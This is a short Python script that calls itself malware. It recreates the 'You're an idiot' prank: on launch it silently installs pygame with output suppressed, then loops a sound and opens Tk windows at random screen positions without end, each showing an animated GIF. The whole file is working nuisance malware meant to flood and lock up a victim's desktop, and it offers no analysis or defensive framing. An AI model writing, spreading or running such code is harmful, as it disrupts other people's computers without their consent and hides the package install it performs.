from tkinter import *
from tkinter import messagebox
import os




# ---------------------------- <INSTALLING REQUIREMENTS CODE> ---------------------------- #

try:
    import getpass
    import pygame

except ImportError:
    print("[+] Installing requirements...")
    os.system("pip install pygame >NUL 2>&1")



# ---------------------------- <MAIN CODE> ---------------------------- #



def start_malware():
    import tkinter as tk
    from PIL import Image, ImageTk, ImageSequence
    import threading
    import random
    import time
    import pygame
    import os

    
    def play_sound():
            if os.path.exists("idiot.wav"):
                pygame.mixer.init()
                pygame.mixer.music.load("idiot.wav")
                pygame.mixer.music.play(-1)
   
    def show_gif(window):
        canvas = tk.Canvas(window, width=200, height=200, highlightthickness=0)
        canvas.pack()

        gif = Image.open("idiot.gif")
        frames = [ImageTk.PhotoImage(frame.copy().resize((200, 200))) for frame in ImageSequence.Iterator(gif)]

        def animate(counter=0):
            canvas.create_image(0, 0, anchor=tk.NW, image=frames[counter])
            window.after(100, animate, (counter + 1) % len(frames))

        animate()

    
    def open_window():
        while True:
            x = random.randint(0, 600)
            y = random.randint(0, 300)
            win = tk.Toplevel()
            win.geometry(f"200x200+{x}+{y}")
            win.title("You're an idiot!")
            show_gif(win)
            time.sleep(0.2)


    def main():
        root = tk.Tk()
        root.withdraw()

        
        threading.Thread(target=play_sound, daemon=True).start()

        
        threading.Thread(target=open_window, daemon=True).start()

        root.mainloop()

    if __name__ == "__main__":
        main()
        pass
    pass



start_malware()
